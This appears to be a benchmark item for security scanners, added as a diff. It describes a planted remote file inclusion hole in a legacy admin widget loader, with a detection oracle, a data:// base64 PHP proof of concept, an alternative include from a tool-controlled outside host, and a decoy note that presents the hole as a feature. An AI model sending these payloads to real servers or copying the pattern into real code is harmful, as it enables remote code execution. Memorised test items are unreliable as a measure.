@@ -1,0 +1,37 @@
+id: BENCH-LEGY-0006
+title: Remote file inclusion in the staff console panel loader
+app: legacy
+component: web
+class: rfi
+severity: critical
+entrypoint:
+  method: GET
+  path: /admin/widget.php
+  auth: admin
+  param: source
+  param_in: query
+  default_value: panels/stock-summary.php
+discovery:
+  render: server-template
+  reachable_from:
+  - /admin/index.php
+  requires:
+  - form-submit
+  difficulty: 4
+oracle:
+  kind: oob
+  condition: |
+    The console renders each dashboard panel by including the path in `source`, and the interpreter is configured to let include() open URL streams. Immediately before the include the destination host is declared to the egress correlation registry, so a lookup or a connection observed by the resolver for the whole target network is joined back to this request whatever domain the caller chose. The in-application sink additionally reports when the include really did return from a non-filesystem stream -- the stream appears in the process's list of included files -- which is what separates code having arrived from outside from a name merely having been looked up. A source that never opens reports neither.
+  poc: GET /admin/widget.php?source=data://text/plain;base64,PD9waHAgZWNobyAncGFuZWwnOyA/Pg== as staff.
+    A stream that is not the filesystem is what the counter reports on, and the data wrapper is the
+    form that fires inside a network with no route out; http://<any host the tool controls>/panel.txt
+    is the same finding and additionally raises the callback the sinkhole attributes.
+  signal: console.widget.include_remote
+tags:
+- admin
+- oob
+- include
+introduced: '2026-09-05'
+decoy_note: 'Panels were meant to be pluggable: operations could drop a new partial into the folder, or
+  point a panel at the reporting box on the other rack. Pointing one at an address was a feature, and
+  the interpreter was configured to allow it.'
